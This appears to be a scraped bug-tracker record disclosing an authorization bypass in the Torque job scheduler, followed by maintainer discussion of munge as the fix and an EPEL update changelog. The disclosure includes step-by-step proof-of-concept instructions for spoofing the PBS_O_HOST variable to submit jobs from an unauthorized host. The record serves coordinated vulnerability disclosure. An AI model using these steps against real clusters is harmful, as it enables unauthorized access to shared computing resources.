						"thetext": "User-Agent:       Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C)\n\nThis Vulnerability was found not by the submitter of the bug but by Bartlomiej Balcerek@pwr.wroc.pl (Bartlomiej.Balcerek@pwr.wroc.pl) \n\nTorque, at least recent version (3.0.1) and GLite versions (e.g.\n2.3.13,2.4.12) are vulnerable to authorization bypass attack.\n\nTorque's server, during authorization relies on data provided\nby \"qsub\" client. Qsub provides submit host name to server (hidden way),\nwhich is used by server to authenticate request.\n\nUsing subverted PBS_O_HOST parameter it is possible to\nomit at least three (of four) authorization mechanisms Torque uses:\n\n1)  RCmd, using ruserok() function,\n2) \"submit_hosts\" server parameter,\n3) \"allow_node_submit\" server parameter\n\nAs for the 4th mechanism: ACL (\"acl_host_enable\" option) it is proof\nagainst such authorization bypass.\n\nThe \"orighost\" is taken from settable on client side variable pbs_o_host:\n\n\"src/lib/Libsite/site_check_u.c\":\n\n   orighost = get_variable(pjob, pbs_o_host);\n\n\nThen three checks are performed to authorize submit host. All\nrefer \"orighost\" variable.\n\n1)\n\"src/lib/Libsite/site_check_u.c\":\n    \n  rc = ruserok(orighost, 0, owner, luser);\n\n   if (rc != 0 && EMsg != NULL)\n        {\n ...\n  snprintf(EMsg, 1024, \"ruserok failed validating %s/%s from %s\",\n                 owner,\n                 luser,\n                 orighost);\n2)\n\"src/lib/Libsite/site_check_u.c\":\n\n for (hostnum = 0;hostnum < submithosts->as_usedptr;hostnum++)\n      {\n      testhost = submithosts->as_string[hostnum];\n\n      if (!strcasecmp(testhost, orighost))\n        {\n        /* job submitted from host found in trusted submit host list,\naccess allowed */\n\n\n3)\n\"src/lib/Libsite/site_check_u.c\":\n\n  if ((HostAllowed == 0) &&\n          (server.sv_attr[SRV_ATR_AllowNodeSubmit].at_flags &\nATR_VFLAG_SET) &&\n          (server.sv_attr[SRV_ATR_AllowNodeSubmit].at_val.at_long     == 1) &&\n          (find_nodebyname(orighost) != NULL))\n        {\n        /* job submitted from compute host, access allowed */\n\n\nProof if concept:\n\n1. Pick the site you want to check against vulnerability, check if its\nport 15001 is open to you,\n2. Check its Torque version ,\n3. Choose a machine, that is not authorized to submit jobs, you must\nhave root access to this machine,\n4. Pick an appropriate  Torque version from\nhttp://www.clusterresources.com/downloads/torque/\nYou can choose v. 2.3.6 to perform check against Torque server <= 2.4.12\n5. Apply the attached patch e.g.:\n\npatch -p1 < torque-2.3.6-customargs.patch\n\n6. Configure and make e.g..:\n\n./configure --with-server-home=/opt/Torque-2.3.6/spool\n--prefix=/opt/Torque-2.3.6 --disable-server --disable-mom\n\nmake\nmake install (from root account)\n\n7. Guess/choose any remote account name,\n\n8. Create an account of such name on your local machine, and\nperform next task using this account,\n\n9. Try to submit a job in regular way e.g.:\n\necho /bin/sleep 100 | /opt/Torque-2.3.6/bin/qsub -q @<site address>\n\nAt the end of the output you should see that your job was rejected:\n\nqsub: Bad UID for job execution MSG=ruserok failed validating\nbartol/bartol from sec.wcss.wroc.pl\n\n10. Check PBS_O_HOST variable on \"Variable_List\" in qsub output.\nIt should be changed to addres of valid \"submit host\". Server name\nitself is good idea there.\n\n11. Submit a job with changed PBS_O_HOST on variable list e.g.:\n\necho /bin/sleep 100 | /opt/Torque-2.3.6/bin/qsub -q @batch.wcss.wroc.pl\n-Z \"Variable_List=PBS_O_HOME=/hom\ne/bartol,PBS_O_LANG=pl_PL.utf8,PBS_O_LOGNAME=bartol,PBS_O_PATH=/usr/lib64/qt-3.3/bin:/usr/NX/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:/home/bartol/bin,PBS_O_MAIL=/var/spool/mail/bartol,PBS_O_SHELL=/bin/bash,PBS_SERVER=sec.wcss.wroc.pl,PBS_O_HOST=batch.wcss.wroc.pl,PBS_O_WORKDIR=/home/bartol\"\n\nThe submission should succeed now.\n\n\n\nReproducible: Always\n\n\n\n\nThis bug has already been reported to the Torque providers and the EGI Software Vulnerability Group (SVG)\n\nThe EGI http://www.egi.eu/ Software Vulnerability group  http://www.egi.eu/policy/groups/Software_Vulnerability_Group_SVG.html runs a process for handling software vulnerabilities reported. While our work is primarily designed to handle vulnerabilities in Grid Middleware, other vulnerabilities found in software used in the EGI infrastructure may also be reported to us and we pass the information on to the software suppliers, as well as considering the risk to the EGI infrastructure."

I believe EPEL tries to follow RHEL-style rules when it comes to updates, so I don't know if adding munge support to those is feasible.\n\nDoes this go away when munge support is enabled?  I.e. there is no need fot the server to obtain this orighost variable from the client as described (munge obsoletes this code perhaps)?\n\nI'm afraid I don't fully understand how munge support makes this not vulnerable.\n\nAny further word from upstream regarding this?  Perhaps in such a way that those installs that are not compiled with munge and/or don't have munge available, can be protected?"

Upstream is now in CC.\n\nMunge it is then.\n\nOh and thanks digger deaper.\n\nSteve."

Ken, do you have plans to correct the problem and make this information public?  This would affect more than just us, regarding people that do not have munge available or having torque built against it.\n\nWe would like to make this bug and the information public at some point, but definitely want to respect your timeframe and solutions.  I also suspect that Linda would appreciate knowing when this would be public as well.\n\nWe can assist with assigning a CVE name to this flaw, and if we can help in other ways to facilitate this (perhaps advising other vendors when a suitable patch/solution is prepared), we would like to.\n\nPlease advise."

	"notes": "**Warning: Significant change, munge enabled - action required:**\r\n\r\nThe updated EPEL6 build of torque-2.5.7-1 as compared to previous versions enables munge[1] as an inter node authentication method.\r\n\r\nIt is highly advisable that prior to upgrading to version 2.5.7-1 of this torque package that munge is installed and enabled. A munge package[2] is of course available within EPEL6.\r\n\r\n * [1] http://code.google.com/p/munge/\r\n * [2] https://admin.fedoraproject.org/community/?package=munge#package_maintenance\r\n\r\nTo enable munge on your torque cluster:\r\n\r\n * Install the munge package on your pbs_server and submission hosts in your cluster.\r\n * On one host generate a key with */usr/sbin/create-munge-key*\r\n * Copy the key, /etc/munge/munge.key to your pbs_server and submission hosts on your cluster.\r\n * Start the munge daemon on these nodes.. **service munge start && chkconfig munge on**\r\n\r\n**ChangeLog:**\r\n\r\n2.5.7:\r\n\r\n * e - Added new qsub argument -F. This argument takes a quoted string as an argument. The string is a list of space separated commandline arguments which are available to the job script. \r\n * e - Added an option to asynchronously delete jobs (currently cannot work for qdel -a all due to limitations of single threads) backported from 3.0.2\r\n * c - Fix an issue where job_purge didn't protect key variables that resulted in crashes\r\n * b - fix bugzilla #134, qmgr -= was deleting all entries (backported from 3.0.2)\r\n * b - do not prepend ${HOME} with the current dir for -o and -e in qsub (backported from 3.0.2)\r\n * b - fix jobs named with -J not always having the server name appended correctly (backported from 3.0.2)\r\n * b - make it so that jobs named like arrays via -J have legal output and error file names (backported from 3.0.2)\r\n * b - Fixed a bug for high availability. The -l listener option for pbs_server was not complete and did not allow pbs_server to properly communicate with the scheduler. Also fixed a bug with job dependencies where the second server or later in the $TORQUE_HOME/server_name directory was not added as part of the job dependecny so dependent jobs would get stuck on hold if the current server was not the first server in the server_name file.\r\n * b - Fixed a potential buffer overflow problem in src/resmom/checkpoint.c function mom_checkpoint_recover. I modified the code to change strcpy and strcat to strncpy and strncpy.\r\n\r\n2.5.6\r\n\r\n * b - Made changes to record_jobinfo and supporting functions to be able to use dynamically allcated buffers for data. This fixed a problem where incoming data overran fixed sized buffers.\r\n * b - restored functionality for -W umask as reported in bugzilla 115 (backported from 3.0.1)\r\n * b - Updated torque.spec.in to be able to handle the snapshot names of builds.\r\n * e - Added new MOM configure option job_starter. This options will execute the script submitted in qsub to the executable or script provided as the argument to the job_starter option of the MOM configure file.\r\n * b - fix pbs_mom -q to work with parallel jobs (backported from 3.0.1)\r\n * b - fixed a problem with pbs_server high availability where the current server could not keep the HA lock. The problem was a result of truncating the directory name where the lock file was kept. TORQUE would fail to validate permissions because it would do a stat on the wrong directory.\r\n * b - Added code to free the mom.lock file during MOM shutdown.\r\n * b - fixed a bug in set_resources that prevented the last resource in a list from being checked. As a result the last item in the list would always be added without regard to previous entries.\r\n * e - Added new symbol JOB_EXEC_OVERLIMIT. When a job exceeds a limit (i.e. walltime) the job will fail with the JOB_EXEC_OVERLIMIT value and also produce an abort case for mailing purposes. Previous to this change a job exceeding a limit returned 0 on success and no mail was sent to the user if requested on abort.\r\n * e - Added options to buildutils/torque.spec.in to conditionally build munge, BLCR, high-availability, cpusets, and spooling. Also allows customization of the sendmail path and allows for optional XML conversion to serverdb.\r\n * b - --with-tcp-retry-limit now actually changes things without needing to run autoheader\r\n * e - Added a new queue resource named procct. procct allows the administrator to set queue limits based on the number of total processors requested in a job. Patch provided by Martin Siegert.\r\n * e - allow more than 5 concurrent connections to TORQUE using pbsD_connect. Increase it to 10 (backported from 3.0.1)\r\n * b - fix a segfault when receiving an obit for a job that no longer exists (backported from 3.0.1)\r\n * b - also remove the procct resource when it is applied because of a default (backported from 3.0.1)\r\n * e - allow an administator using the proxy user submission to also set the job id to be used in TORQUE. This makes TORQUE easier to use in grid configurations. (backported from 3.0.2)\r\n * c - fix a segfault when queue has acl_group_enable and acl_group_sloppy set true and no acl_groups are defined. (backported from 3.0.1)\r\n * f - Added the ability to detect Nvidia gpus using nvidia-smi (default) or NVML. Server receives gpu statuses from pbs_mom. Added server attribute auto_node_gpu that allows automatically setting number of gpus for nodes based on gpu statuses. Added new configure options --enable-nvidia-gpus, --with-nvml-include and --with-nvml-lib.\r\n * e - The -e and -o options of qsub allow a user to specify a path or optionally a filename for output. If the path given by the user ended with a directory name but no '/' character at the end then TORQUE was confused and would not convert the .OU or .ER file to the final output/error file. The code has now been changed to stat the path to see if the end path element is a path or directory and handled appropriately.\r\n * c - fix a segfault when using --enable-nvidia-gpus and pbs_mom has Nvidia driver older than 260 that still has nvidia-smi command\r\n * e - Added new MOM configuration option $rpp_throttle. The syntax for this in the $TORQUE_HOME/mom_priv/config file is $rpp_throttle <value> where value is a long representing microseconds. Setting this values causes rpp data to pause after every sendto for <value> microseconds. This may help with large jobs where full data does not arrive at sister nodes.\r\n * c - check if the file pointer to /dev/console can be opened. If not, don't attempt to write it (backported from 3.0.2)\r\n * b - Added patch from Michael Jennings to buildutils/torque.spec.in. This patch allows an rpm configured with DRMAA to complete even if all of the support files are not present on the system.\r\n * b - commited patch submitted by Michael Jennings to fix bug 130. TORQUE on the MOM would call lstat as root when it should call it as user in open_std_file.\r\n * e - Added capability to automatically set mode on Nvidia gpus. Added support for gpu reseterr option on qsub. Removed server attribute auto_node_gpu. The nodes file will be updated with Nvidia gpu count when --enable-nvidia-gpu configure option is used. Moved some code out of job_purge_thread to prevent segfault on mom.\r\n\r\n",
